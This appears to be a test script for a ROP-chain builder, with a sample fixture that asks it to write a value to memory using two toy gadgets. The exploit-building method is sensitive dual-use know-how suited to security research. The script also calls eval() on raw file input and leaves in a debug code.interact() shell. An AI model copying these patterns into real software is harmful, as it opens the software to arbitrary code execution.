def test_write(data_test):
    chain_builder.set_writes(data_test['find'])
    avoid_char = None
    if 'badchars' in data_test:
        avoid_char = data_test['badchars']
    chain_builder.solve_chain_write(avoid_char=avoid_char)

def test_pivot(data_test):
    avoid_char = None
    if 'badchars' in data_test:
        avoid_char = data_test['badchars']
    chain_builder.solve_pivot(data_test['find'], avoid_char=avoid_char)

with open(sys.argv[1], "rb") as fp:
    data_test = eval(fp.read())
    gadgets = data_test['gadgets']
    for addr in gadgets:
        gadgets[addr] = (gadgets[addr], asm_ins(gadgets[addr]))
    chain_builder = ChainBuilder()
    chain_builder.load_list_gadget_string(gadgets)
    chain_builder.analyzeAll()
    code.interact(local=locals())

    if "type" not in data_test or data_test['type'] == 'reg':
        test_reg(data_test)
    elif data_test['type'] == 'write_mem':
        test_write(data_test)
    elif data_test['type'] == 'pivot':
        test_pivot(data_test)

    build_chain = chain_builder.build_chain()
    build_chain.dump()

```

`tests/write`:

```
{
    "type": "write_mem",
    "gadgets": {
        0x1000: 'mov qword ptr [rdx], rdi; ret',
        0x2000: 'pop rdi; pop rdx; ret',
    },
    "find": {
        0x41414141: 0x42424242,
    }
}

```